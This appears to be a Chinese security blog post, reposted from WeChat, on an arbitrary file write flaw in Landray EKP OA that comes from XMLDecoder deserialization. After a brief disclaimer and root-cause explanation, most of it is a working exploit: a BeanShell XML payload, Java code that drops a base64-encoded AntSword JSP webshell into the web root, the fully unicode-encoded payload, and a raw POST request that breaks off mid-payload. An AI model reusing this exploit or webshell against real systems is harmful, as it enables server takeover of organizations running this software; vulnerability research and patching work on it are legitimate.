> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qpr5BITHRBWkqvJwouXLFA)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4O4dl1Y2a9LqiatyWWqR5TBWaDXM0urygClfibLafuVPWuLTpG6XGf1RlxhKke6Km9ys61OSkRiagzw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&retryload=1)

 **文章声明**

  

安全技术类文章仅供参考，此文所提供的信息仅针对漏洞靶场进行渗透，**未经授权****请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。**

本文所提供的工具仅用于学习，禁止用于其他目的，推荐大家在了解技术原理的前提下，更好的维护个人信息安全、企业安全、国家安全。

一、漏洞描述
------

深圳市蓝凌软件股份有限公司数字 OA(EKP) 存在任意文件写入漏洞。攻击者可利用该漏洞写入 webshell 并获取服务器权限。

二、漏洞原理
------

1、在 `com.landray.kmss.sys.search.jar` 中的`com.landray.kmss.sys.search.actions.SysSearchMainAction` 类中，接收内容的参数为 `FdParameters`，`method`参数值为 `editrParam`。对 `fdParemNames` 的内容进行了判断是否为空。

2、如果`fdParemNames` 参数值不为空, 则会继续进入 `SysSearchDictUtil.getParamConditionEntry` 方法，也是继续对 `fdParemNames` 进行了一次判断是否为空。

3、然后传入 `ObjectXML.objectXMLDecoderByString`方法，将传入进来的 `string` 字符进行替换，最后将其载入字节数组缓冲区，再传递给`objectXmlDecoder`。

在 `objectXmlDecoder` 中，就明显是典型的 `xmlDecoder` 反序列化了。

三、漏洞复现
------

任意文件写入漏洞是以上一篇的任意文件读取漏洞为基础的，两者利用的是同一个接口，只不过是`poc`略有不同而已。

访问以下接口

```
/sys/ui/extend/varkind/custom.jsp
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOibDPbcPalA5nrOLbwekgmO6e6RibfTiaq4dttVIhvN4UIUPRc3FVB6OYhm4jzthAkVdJPOUx5uKx5g/640?wx_fmt=jpeg)

根据返回页面可以看到是存在该接口的

利用`payload`如下

```
var={"body":{"file":""/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=[shellcode]
```

在`[shellcode]`位置插入

```
<java>
<void class="bsh.Interpreter">
  <void method="eval">
  <string>......</string>
  </void>
</void>
</java>
```

而这里的`......`就是`unicode`编码后的内容。这里需要编码的内容是写入`webshell`的类文件的全部内容。

这里构造一个写入`webshell`文件的类文件，以蚁剑的`jsp`木马为例，先生成一个`jsp`木马并将其`base64`编码的字符保存到写入字符串中，构造如下

```
import java.lang.*;
import java.io.*;
Class cls=Thread.currentThread().getContextClassLoader().loadClass("bsh.Interpreter");
String path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();
File f=new File(path.split("WEB-INF")[0]+"/loginswzaq.jsp");
f.createNewFile();
FileOutputStream fout=new FileOutputStream(f);
fout.write(new sun.misc.BASE64Decoder().decodeBuffer("PCUhCmNsYXNzIENPTVBBVElCTEUgZXh0ZW5kcyBDbGFzc0xvYWRlcnsKICBDT01QQVRJQkxFKENsYXNzTG9hZGVyIGMpe3N1cGVyKGMpO30KICBwdWJsaWMgQ2xhc3MgY29tcG9zYWJpbGl0eShieXRlW10gYil7CiAgICByZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoYiwgMCwgYi5sZW5ndGgpOwogIH0KfQpwdWJsaWMgYnl0ZVtdIHNjYW4oU3RyaW5nIHN0cikgdGhyb3dzIEV4Y2VwdGlvbiB7CiAgQ2xhc3MgYmFzZTY0OwogIGJ5dGVbXSB2YWx1ZSA9IG51bGw7CiAgdHJ5IHsKICAgIGJhc2U2ND1DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIik7CiAgICBPYmplY3QgZGVjb2RlciA9IGJhc2U2NC5uZXdJbnN0YW5jZSgpOwogICAgdmFsdWUgPSAoYnl0ZVtdKWRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZUJ1ZmZlciIsIG5ldyBDbGFzc1tdIHtTdHJpbmcuY2xhc3MgfSkuaW52b2tlKGRlY29kZXIsIG5ldyBPYmplY3RbXSB7IHN0ciB9KTsKICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgdHJ5IHsKICAgICAgYmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTsKICAgICAgT2JqZWN0IGRlY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKCJnZXREZWNvZGVyIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwgbnVsbCk7CiAgICAgIHZhbHVlID0gKGJ5dGVbXSlkZWNvZGVyLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJkZWNvZGUiLCBuZXcgQ2xhc3NbXSB7IFN0cmluZy5jbGFzcyB9KS5pbnZva2UoZGVjb2RlciwgbmV3IE9iamVjdFtdIHsgc3RyIH0pOwogICAgfSBjYXRjaCAoRXhjZXB0aW9uIGVlKSB7fQogIH0KICByZXR1cm4gdmFsdWU7Cn0KJT4KPCUKU3RyaW5nIGNscyA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJzd3phcSIpOwppZiAoY2xzICE9IG51bGwpIHsKICBuZXcgQ09NUEFUSUJMRSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuY29tcG9zYWJpbGl0eShzY2FuKGNscykpLm5ld0luc3RhbmNlKCkuZXF1YWxzKG5ldyBPYmplY3RbXXtyZXF1ZXN0LHJlc3BvbnNlfSk7Cn0KJT4="));
fout.close()
```

需要注意的一点是将上述代码进行`unicode`编码时要将所有的换行符去掉，具体显示如下

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOibDPbcPalA5nrOLbwekgmOEibZkKLQIicywOa62FAssSDDFBdAicgJ17Z1AiapY4JdlHqKfiacHfvUlIw/640?wx_fmt=jpeg)

将编码后的字符串插入到上面`paylaod`的`......`中进行替换

```
<java><void class="bsh.Interpreter"><void%20method=%22eval%22><string>\u0069\u006d\u0070\u006f\u0072\u0074\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u002a\u003b\u0069\u006d\u0070\u006f\u0072\u0074\u0020\u006a\u0061\u0076\u0061\u002e\u0069\u006f\u002e\u002a\u003b\u0043\u006c\u0061\u0073\u0073\u0020\u0063\u006c\u0073\u003d\u0054\u0068\u0072\u0065\u0061\u0064\u002e\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u0054\u0068\u0072\u0065\u0061\u0064\u0028\u0029\u002e\u0067\u0065\u0074\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072\u0028\u0029\u002e\u006c\u006f\u0061\u0064\u0043\u006c\u0061\u0073\u0073\u0028\u0022\u0062\u0073\u0068\u002e\u0049\u006e\u0074\u0065\u0072\u0070\u0072\u0065\u0074\u0065\u0072\u0022\u0029\u003b\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0070\u0061\u0074\u0068\u003d\u0063\u006c\u0073\u002e\u0067\u0065\u0074\u0050\u0072\u006f\u0074\u0065\u0063\u0074\u0069\u006f\u006e\u0044\u006f\u006d\u0061\u0069\u006e\u0028\u0029\u002e\u0067\u0065\u0074\u0043\u006f\u0064\u0065\u0053\u006f\u0075\u0072\u0063\u0065\u0028\u0029\u002e\u0067\u0065\u0074\u004c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u0028\u0029\u002e\u0067\u0065\u0074\u0050\u0061\u0074\u0068\u0028\u0029\u003b\u0046\u0069\u006c\u0065\u0020\u0066\u003d\u006e\u0065\u0077\u0020\u0046\u0069\u006c\u0065\u0028\u0070\u0061\u0074\u0068\u002e\u0073\u0070\u006c\u0069\u0074\u0028\u0022\u0057\u0045\u0042\u002d\u0049\u004e\u0046\u0022\u0029\u005b\u0030\u005d\u002b\u0022\u002f\u006c\u006f\u0067\u0069\u006e\u0073\u0077\u007a\u002e\u006a\u0073\u0070\u0022\u0029\u003b\u0066\u002e\u0063\u0072\u0065\u0061\u0074\u0065\u004e\u0065\u0077\u0046\u0069\u006c\u0065\u0028\u0029\u003b\u0046\u0069\u006c\u0065\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0066\u006f\u0075\u0074\u003d\u006e\u0065\u0077\u0020\u0046\u0069\u006c\u0065\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0066\u0029\u003b\u0066\u006f\u0075\u0074\u002e\u0077\u0072\u0069\u0074\u0065\u0028\u006e\u0065\u0077\u0020\u0073\u0075\u006e\u002e\u006d\u0069\u0073\u0063\u002e\u0042\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072\u0028\u0029\u002e\u0064\u0065\u0063\u006f\u0064\u0065\u0042\u0075\u0066\u0066\u0065\u0072\u0028\u0022\u0050\u0043\u0055\u0068\u0043\u006d\u004e\u0073\u0059\u0058\u004e\u007a\u0049\u0045\u004e\u0050\u0054\u0056\u0042\u0042\u0056\u0045\u006c\u0043\u0054\u0045\u0055\u0067\u005a\u0058\u0068\u0030\u005a\u0057\u0035\u006b\u0063\u0079\u0042\u0044\u0062\u0047\u0046\u007a\u0063\u0030\u0078\u0076\u0059\u0057\u0052\u006c\u0063\u006e\u0073\u004b\u0049\u0043\u0042\u0044\u0054\u0030\u0031\u0051\u0051\u0056\u0052\u004a\u0051\u006b\u0078\u0046\u004b\u0045\u004e\u0073\u0059\u0058\u004e\u007a\u0054\u0047\u0039\u0068\u005a\u0047\u0056\u0079\u0049\u0047\u004d\u0070\u0065\u0033\u004e\u0031\u0063\u0047\u0056\u0079\u004b\u0047\u004d\u0070\u004f\u0033\u0030\u004b\u0049\u0043\u0042\u0077\u0064\u0057\u004a\u0073\u0061\u0057\u004d\u0067\u0051\u0032\u0078\u0068\u0063\u0033\u004d\u0067\u0059\u0032\u0039\u0074\u0063\u0047\u0039\u007a\u0059\u0057\u004a\u0070\u0062\u0047\u006c\u0030\u0065\u0053\u0068\u0069\u0065\u0058\u0052\u006c\u0057\u0031\u0030\u0067\u0059\u0069\u006c\u0037\u0043\u0069\u0041\u0067\u0049\u0043\u0042\u0079\u005a\u0058\u0052\u0031\u0063\u006d\u0034\u0067\u0063\u0033\u0056\u0077\u005a\u0058\u0049\u0075\u005a\u0047\u0056\u006d\u0061\u0057\u0035\u006c\u0051\u0032\u0078\u0068\u0063\u0033\u004d\u006f\u0059\u0069\u0077\u0067\u004d\u0043\u0077\u0067\u0059\u0069\u0035\u0073\u005a\u0057\u0035\u006e\u0064\u0047\u0067\u0070\u004f\u0077\u006f\u0067\u0049\u0048\u0030\u004b\u0066\u0051\u0070\u0077\u0064\u0057\u004a\u0073\u0061\u0057\u004d\u0067\u0059\u006e\u006c\u0030\u005a\u0056\u0074\u0064\u0049\u0048\u004e\u006a\u0059\u0057\u0034\u006f\u0055\u0033\u0052\u0079\u0061\u0057\u0035\u006e\u0049\u0048\u004e\u0030\u0063\u0069\u006b\u0067\u0064\u0047\u0068\u0079\u0062\u0033\u0064\u007a\u0049\u0045\u0056\u0034\u0059\u0032\u0056\u0077\u0064\u0047\u006c\u0076\u0062\u0069\u0042\u0037\u0043\u0069\u0041\u0067\u0051\u0032\u0078\u0068\u0063\u0033\u004d\u0067\u0059\u006d\u0046\u007a\u005a\u0054\u0059\u0030\u004f\u0077\u006f\u0067\u0049\u0047\u004a\u0035\u0064\u0047\u0056\u0062\u0058\u0053\u0042\u0032\u0059\u0057\u0078\u0031\u005a\u0053\u0041\u0039\u0049\u0047\u0035\u0031\u0062\u0047\u0077\u0037\u0043\u0069\u0041\u0067\u0064\u0048\u004a\u0035\u0049\u0048\u0073\u004b\u0049\u0043\u0041\u0067\u0049\u0047\u004a\u0068\u0063\u0032\u0055\u0032\u004e\u0044\u0031\u0044\u0062\u0047\u0046\u007a\u0063\u0079\u0035\u006d\u0062\u0033\u004a\u004f\u0059\u0057\u0031\u006c\u004b\u0043\u004a\u007a\u0064\u0057\u0034\u0075\u0062\u0057\u006c\u007a\u0059\u0079\u0035\u0043\u0051\u0056\u004e\u0046\u004e\u006a\u0052\u0045\u005a\u0057\u004e\u0076\u005a\u0047\u0056\u0079\u0049\u0069\u006b\u0037\u0043\u0069\u0041\u0067\u0049\u0043\u0042\u0050\u0059\u006d\u0070\u006c\u0059\u0033\u0051\u0067\u005a\u0047\u0056\u006a\u0062\u0032\u0052\u006c\u0063\u0069\u0041\u0039\u0049\u0047\u004a\u0068\u0063\u0032\u0055\u0032\u004e\u0043\u0035\u0075\u005a\u0058\u0064\u004a\u0062\u006e\u004e\u0030\u0059\u0057\u0035\u006a\u005a\u0053\u0067\u0070\u004f\u0077\u006f\u0067\u0049\u0043\u0041\u0067\u0064\u006d\u0046\u0073\u0064\u0057\u0055\u0067\u0050\u0053\u0041\u006f\u0059\u006e\u006c\u0030\u005a\u0056\u0074\u0064\u004b\u0057\u0052\u006c\u0059\u0032\u0039\u006b\u005a\u0058\u0049\u0075\u005a\u0032\u0056\u0030\u0051\u0032\u0078\u0068\u0063\u0033\u004d\u006f\u004b\u0053\u0035\u006e\u005a\u0058\u0052\u004e\u005a\u0058\u0052\u006f\u0062\u0032\u0051\u006f\u0049\u006d\u0052\u006c\u0059\u0032\u0039\u006b\u005a\u0055\u004a\u0031\u005a\u006d\u005a\u006c\u0063\u0069\u0049\u0073\u0049\u0047\u0035\u006c\u0064\u0079\u0042\u0044\u0062\u0047\u0046\u007a\u0063\u0031\u0074\u0064\u0049\u0048\u0074\u0054\u0064\u0048\u004a\u0070\u0062\u006d\u0063\u0075\u0059\u0032\u0078\u0068\u0063\u0033\u004d\u0067\u0066\u0053\u006b\u0075\u0061\u0057\u0035\u0032\u0062\u0032\u0074\u006c\u004b\u0047\u0052\u006c\u0059\u0032\u0039\u006b\u005a\u0058\u0049\u0073\u0049\u0047\u0035\u006c\u0064\u0079\u0042\u0050\u0059\u006d\u0070\u006c\u0059\u0033\u0052\u0062\u0058\u0053\u0042\u0037\u0049\u0048\u004e\u0030\u0063\u0069\u0042\u0039\u004b\u0054\u0073\u004b\u0049\u0043\u0042\u0039\u0049\u0047\u004e\u0068\u0064\u0047\u004e\u006f\u0049\u0043\u0068\u0046\u0065\u0047\u004e\u006c\u0063\u0048\u0052\u0070\u0062\u0032\u0034\u0067\u005a\u0053\u006b\u0067\u0065\u0077\u006f\u0067\u0049\u0043\u0041\u0067\u0064\u0048\u004a\u0035\u0049\u0048\u0073\u004b\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0059\u006d\u0046\u007a\u005a\u0054\u0059\u0030\u0050\u0055\u004e\u0073\u0059\u0058\u004e\u007a\u004c\u006d\u005a\u0076\u0063\u006b\u0035\u0068\u0062\u0057\u0055\u006f\u0049\u006d\u0070\u0068\u0064\u006d\u0045\u0075\u0064\u0058\u0052\u0070\u0062\u0043\u0035\u0043\u0059\u0058\u004e\u006c\u004e\u006a\u0051\u0069\u004b\u0054\u0073\u004b\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0054\u0032\u004a\u0071\u005a\u0057\u004e\u0030\u0049\u0047\u0052\u006c\u0059\u0032\u0039\u006b\u005a\u0058\u0049\u0067\u0050\u0053\u0042\u0069\u0059\u0058\u004e\u006c\u004e\u006a\u0051\u0075\u005a\u0032\u0056\u0030\u0054\u0057\u0056\u0030\u0061\u0047\u0039\u006b\u004b\u0043\u004a\u006e\u005a\u0058\u0052\u0045\u005a\u0057\u004e\u0076\u005a\u0047\u0056\u0079\u0049\u0069\u0077\u0067\u0062\u006e\u0056\u0073\u0062\u0043\u006b\u0075\u0061\u0057\u0035\u0032\u0062\u0032\u0074\u006c\u004b\u0047\u004a\u0068\u0063\u0032\u0055\u0032\u004e\u0043\u0077\u0067\u0062\u006e\u0056\u0073\u0062\u0043\u006b\u0037\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0048\u005a\u0068\u0062\u0048\u0056\u006c\u0049\u0044\u0030\u0067\u004b\u0047\u004a\u0035\u0064\u0047\u0056\u0062\u0058\u0053\u006c\u006b\u005a\u0057\u004e\u0076\u005a\u0047\u0056\u0079\u004c\u006d\u0064\u006c\u0064\u0045\u004e\u0073\u0059\u0058\u004e\u007a\u004b\u0043\u006b\u0075\u005a\u0032\u0056\u0030\u0054\u0057\u0056\u0030\u0061\u0047\u0039\u006b\u004b\u0043\u004a\u006b\u005a\u0057\u004e\u0076\u005a\u0047\u0055\u0069\u004c\u0043\u0042\u0075\u005a\u0058\u0063\u0067\u0051\u0032\u0078\u0068\u0063\u0033\u004e\u0062\u0058\u0053\u0042\u0037\u0049\u0046\u004e\u0030\u0063\u006d\u006c\u0075\u005a\u0079\u0035\u006a\u0062\u0047\u0046\u007a\u0063\u0079\u0042\u0039\u004b\u0053\u0035\u0070\u0062\u006e\u005a\u0076\u0061\u0032\u0055\u006f\u005a\u0047\u0056\u006a\u0062\u0032\u0052\u006c\u0063\u0069\u0077\u0067\u0062\u006d\u0056\u0033\u0049\u0045\u0039\u0069\u0061\u006d\u0056\u006a\u0064\u0046\u0074\u0064\u0049\u0048\u0073\u0067\u0063\u0033\u0052\u0079\u0049\u0048\u0030\u0070\u004f\u0077\u006f\u0067\u0049\u0043\u0041\u0067\u0066\u0053\u0042\u006a\u0059\u0058\u0052\u006a\u0061\u0043\u0041\u006f\u0052\u0058\u0068\u006a\u005a\u0058\u0042\u0030\u0061\u0057\u0039\u0075\u0049\u0047\u0056\u006c\u004b\u0053\u0042\u0037\u0066\u0051\u006f\u0067\u0049\u0048\u0030\u004b\u0049\u0043\u0042\u0079\u005a\u0058\u0052\u0031\u0063\u006d\u0034\u0067\u0064\u006d\u0046\u0073\u0064\u0057\u0055\u0037\u0043\u006e\u0030\u004b\u004a\u0054\u0034\u004b\u0050\u0043\u0055\u004b\u0055\u0033\u0052\u0079\u0061\u0057\u0035\u006e\u0049\u0047\u004e\u0073\u0063\u0079\u0041\u0039\u0049\u0048\u004a\u006c\u0063\u0058\u0056\u006c\u0063\u0033\u0051\u0075\u005a\u0032\u0056\u0030\u0055\u0047\u0046\u0079\u0059\u0057\u0031\u006c\u0064\u0047\u0056\u0079\u004b\u0043\u004a\u007a\u0064\u0033\u0070\u0068\u0063\u0053\u0049\u0070\u004f\u0077\u0070\u0070\u005a\u0069\u0041\u006f\u0059\u0032\u0078\u007a\u0049\u0043\u0045\u0039\u0049\u0047\u0035\u0031\u0062\u0047\u0077\u0070\u0049\u0048\u0073\u004b\u0049\u0043\u0042\u0075\u005a\u0058\u0063\u0067\u0051\u0030\u0039\u004e\u0055\u0045\u0046\u0055\u0053\u0055\u004a\u004d\u0052\u0053\u0068\u0030\u0061\u0047\u006c\u007a\u004c\u006d\u0064\u006c\u0064\u0045\u004e\u0073\u0059\u0058\u004e\u007a\u004b\u0043\u006b\u0075\u005a\u0032\u0056\u0030\u0051\u0032\u0078\u0068\u0063\u0033\u004e\u004d\u0062\u0032\u0046\u006b\u005a\u0058\u0049\u006f\u004b\u0053\u006b\u0075\u0059\u0032\u0039\u0074\u0063\u0047\u0039\u007a\u0059\u0057\u004a\u0070\u0062\u0047\u006c\u0030\u0065\u0053\u0068\u007a\u0059\u0032\u0046\u0075\u004b\u0047\u004e\u0073\u0063\u0079\u006b\u0070\u004c\u006d\u0035\u006c\u0064\u0030\u006c\u0075\u0063\u0033\u0052\u0068\u0062\u006d\u004e\u006c\u004b\u0043\u006b\u0075\u005a\u0058\u0046\u0031\u0059\u0057\u0078\u007a\u004b\u0047\u0035\u006c\u0064\u0079\u0042\u0050\u0059\u006d\u0070\u006c\u0059\u0033\u0052\u0062\u0058\u0058\u0074\u0079\u005a\u0058\u0046\u0031\u005a\u0058\u004e\u0030\u004c\u0048\u004a\u006c\u0063\u0033\u0042\u0076\u0062\u006e\u004e\u006c\u0066\u0053\u006b\u0037\u0043\u006e\u0030\u004b\u004a\u0054\u0034\u003d\u0022\u0029\u0029\u003b\u0066\u006f\u0075\u0074\u002e\u0063\u006c\u006f\u0073\u0065\u0028\u0029</string></void></void></java>
```

如同上一篇中的任意文件读取过程一样，抓包修改之后放包即可写入`webshell`

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOibDPbcPalA5nrOLbwekgmODleGhXLrNEdgkyVugEiaic67M7CEKUJB0k5TnEsW0sfZAwic6wQZjAFaA/640?wx_fmt=jpeg)

```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
Content-Length: 10967
Host: xx.xx.xx
Connection: close

var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=12&fdParameters=<java><void class="bsh.Interpreter"><void%20method=%22eval%22><string>\u0069\u006d\u0070\u006f\u0072\u0074\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u002a\u003b\u0069\u006d\u0070\u006f\u0072\u0074\u0020\u006a\u0061\u0076\u0061\u002e\u0069\u006f\u002e\u002a\u003b\u0043\u006c\u0061\u0073\u0073\u0020\u0063\u006c\u0073\u003d\u0054\u0068\u0072\u0065\u0061\u0064\u002e\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u0054\u0068\u0072\u0065\u0061\u0064\u0028\u0029\u002e\u0067\u0065\u0074\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0043\u006c\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072\u0028\u0029\u002e\u006c\u006f\u0061\u0064\u0043\u006c\u0061\u0073\u0073\u0028\u0022\u0062\u0073\u0068\u002e\u0049\u006e\u0074\u0065\u0072\u0070\u0072\u0065\u0074\u0065\u0072\u0022\u0029\u003b\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0070\u0061\u0074\u0068\u003d\u0063\u006c\u0073\u002e\u0067\u0065\u0074\u0050\u0072\u006f\u0074\u0065\u0063\u0074\u0069\u006f\u006e\u0044\u006f\u006d\u0061\u0069\u006e\u0028\u0029\u002e\u0067\u0065\u0074\u0043\u006f\u0064\u0065\u0053\u006f\u0075\u0072\u0063\u0065\u0028\u0029\u002e\u0067\u0065\u0074\u004c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u0028\u0029\u002e\u0067\u0065\u0074\u0050\u0061\u0074\u0068\u0028\u0029\u003b\u0046\u0069\u006c\u0065\u0020\u0066\u003d\u006e\u0065\u0077\u0020\u0046\u0069\u006c\u0065\u0028\u0070\u0061\u0074\u0068\u002e\u0073\u0070\u006c\u0069\u0074\u0028\u0022\u0057\u0045\u0042\u002d\u0049\u004e\u0046\u0022\u0029\u005b\u0030\u005d\u002b\u0022\u002f\u006c\u006f\u0067\u0069\u006e\u0073\u0077\u007a\u002e\u006a\u0073\u0070\u0022\u0029\u003b\u0066\u002e\u0063\u0072\u0065\u0061\u0074\u0065\u004e\u0065\u0077\u0046\u0069\u006c\u0065\u0028\u0029\u003b\u0046\u0069\u006c\u0065\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0066\u006f\u0075\u0074\u003d\u006e\u0065\u0077\u0020\u0046\u0069\u006c\u0065\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0066\u0029\u003b\u0066\u006f\u0075\u0074\u002e\u0077\u0072\u0069\u0074\u0065\u0028\u006e\u0065\u0077\u0020\u0073\u0075\u006e\u002e\u006d\u0069\u0073\u0063\u002e\u0042\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072\u0028\u0029\u002e\u0064\u0065\u0063\u006f\u0064\u0065\u0042\u0075\u0066\u0066\u0065\u0072\u0028\u0022\u0050\u0043\u0055\u0068\u0043\u006d\u004e\u0073\u0059\u0058\u004e\u007a\u0049\u0045\u004e\u0050\u0054\u0056\u0042\u0042\u0056\u0045\u006c\u0043\u0054\u0045\u0055\u0067\u005a\u0058\u0068\u0030\u005a\u0057\u0035\u006b\u0063\u0079\u0042\u0044\u0062\u0047\u0046\u007a\u0063\u0030\u0078\u0076\u0059\u0057\u0052\u006c\u0063\u006e\u0073\u004b\u0049\u0043\u0042\u0044\u0054\u0030\u0031\u0051\u0051\u0056\u0052\u004a\u0051\u006b\u0078\u0046\u004b\u0045\u004e\u0073\u0059\u0058\u004e\u007a\u0054\u0047\u0039\u0068\u005a\u0047\u0056\u0079\u0049\u0047\u004d\u0070\u0065\u0033\u004e\u0031\u0063\u0047\u0056\u0079\u004b\u0047\u004d\u0070\u004f\u0033\u0030\u004b\u0049\u0043\u0042\u0077\u0064\u0057\u004a\u0073\u0061\u0057\u004d\u0067\u0051\u0032\u0078\u0068\u0063\u0033\u004d\u0067\u0059\u0032\u0039\u0074\u0063\u0047\u0039\u007a\u0059\u0057\u004a\u0070\u0062\u0047\u006c\u0030\u0065\u0053\u0068\u0069\u0065\u0058\u0052\u006c\u0057\u0031\u0030\u0067\u0059\u0069\u006c\u0037\u0043\u0069\u0041\u0067\u0049\u0043\u0042\u0079\u005a\u0058\u0052\u0031\u0063\u006d\u0034\u0067\u0063\u0033\u0056\u0077\u005a\u0058\u0049\u0075\u005a\u0047\u0056\u006d\u0061\u0057\u0035\u006c\u0051\u0032\u0078\u0068\u0063\u0033\u004d\u006f\u0059\u0069\u0077\u0067\u004d\u0043\u0077\u0067\u0059\u0069\u0035\u0073\u005a\u0057\u0035\u006e\u0064\u0047\u0067\u0070\u004f\u0077\u006f\u0067\u0049\u0048\u0030\u004b\u0066\u0051\u0070\u0077\u0064\u0057\u004a\u0073\u0061\u0057\u004d\u0067\u0059\u006e\u006c\u0030\u005a\u0056\u0074\u0064\u0049\u0048\u004e\u006a\u0059\u0057\u0034\u006f\u0055\u0033\u0052\u0079\u0061\u0057\u0035\u006e\u0049\u0048\u004e\u0030\u0063\u0069\u006b\u0067\u0064\u0047\u0068\u0079\u0062\u0033\u0064\u007a\u0049\u0045\u0056\u0034\u0059\u0032\u0056\u0077\u0064\u0047\u006c\u0076\u0062\u0069\u0042\u0037\u0043\u0069\u0041\u0067\u0051\u0032\u0078\u0068\u0063\u0033\u004d\u0067\u0059\u006d\u0046\u007a\u005a\u0054\u0059\u0030\u004f\u0077\u006f\u0067\u0049\u0047\u004a\u0035\u0064\u0047\u0056\u0062\u0058\u0053\u0042\u0032\u0059\u0057\u0078\u0031\u005a\u0053\u0041\u0039\u0049\u0047\u0035\u0031\u0062\u0047\u0077\u0037\u0043\u0069\u0041\u0067\u0064\u0048\u004a\u0035\u0049\u0048\u0073\u004b\u0049\u0043\u0041\u0067\u0049\u0047\u004a\u0068\u0063\u0032\u0055\u0032\u004e\u0044\u0031\u0044\u0062\u0047\u0046\u007a\u0063\u0079\u0035\u006d\u0062\u0033\u004a\u004f\u0059\u0057\u0031\u006c\u004b\u0043\u004a\u007a\u0064\u0057\u0034\u0075\u0062\u0057\u006c\u007a\u0059\u0079\u0035\u0043\u0051\u0056\u004e\u0046\u004e\u006a\u0052\u0045\u005a\u0057\u004e\u0076\u005a\u0047\u0056\u0079\u0049\u0069\u006b\u0037\u0043\u0069\u0041\u0067\u0049\u0043\u0042\u0050\u0059\u006d\u0070\u006c\u0059\u0033\u0051\u0067\u005a\u0047\u0056\u006a\u0062\u0032\u0052\u006c\u0063\u0069\u0041\u0039\u0049\u0047\u004a\u0068\u0063\u0032\u0055\u0032\u004e\u0043\u0035\u0075\u005a\u0058\u0064\u004a\u0062\u006e\u004e\u0030\u0059\u0057\u0035\u006a\u005a\u0053\u0067\u0070\u004f\u0077\u006f\u0067\u0049\u0043\u0041\u0067\u0064\u006d\u0046\u0073\u0064\u0057\u0055\u0067\u0050\u0053\u0041\u006f\u0059\u006e\u006c\u0030\u005a\u0056\u0074\u0064\u004b\u0057\u0052\u006c\u0059\u0032\u0039\u006b\u005a\u0058\u0049\u0075\u005a\u0032\u0056\u0030\u0051\u0032\u0078\u0068\u0063\u0033\u004d\u006f\u004b\u0053\u0035\u006e\u005a\u0058\u0052\u004e\u005a\u0058\u0052\u006f\u0062\u0032\u0051\u006f\u0049\u006d\u0052\u006c\u0059\u0032\u0039\u006b\u005a\u0055\u004a\u0031\u005a\u006d\u005a\u006c\u0063\u0069\u0049\u0073\u0049\u0047\u0035\u006c\u0064\u0079\u0042\u0044\u0062\u0047\u0046\u007a\u0063\u0031\u0074\u0064\u0049\u0048\u0074\u0054\u0064\u0048\u004a\u0070\u0062\u006d\u0063\u0075\u0059\u0032\u0078\u0068\u0063\u0033\u004d\u0067\u0066\u0053\u006b\u0075\u0061\u0057\u0035\u0032\u0062\u0032\u0074\u006c\u004b\u0047\u0052\u006c\u0059\u0032\u0039\u006b\u005a\u0058\u0049\u0073\u0049\u0047\u0035\u006c\u0064\u0079\u0042\u0050\u0059\u006d\u0070\u006c\u0059\u0033\u0052\u0062\u0058\u0053\u0042\u0037\u0049\u0048\u004e\u0030\u0063\u0069\u0042\u0039\u004b\u0054\u0073\u004b\u0049\u0043\u0042\u0039\u0049\u0047\u004e\u0068\u0064\u0047\u004e\u006f\u0049\u0043\u0068\u0046\u0065\u0047\u004e\u006c\u0063\u0048\u0052\u0070\u0062\u0032\u0034\u0067\u005a\u0053\u006b\u0067\u0065\u00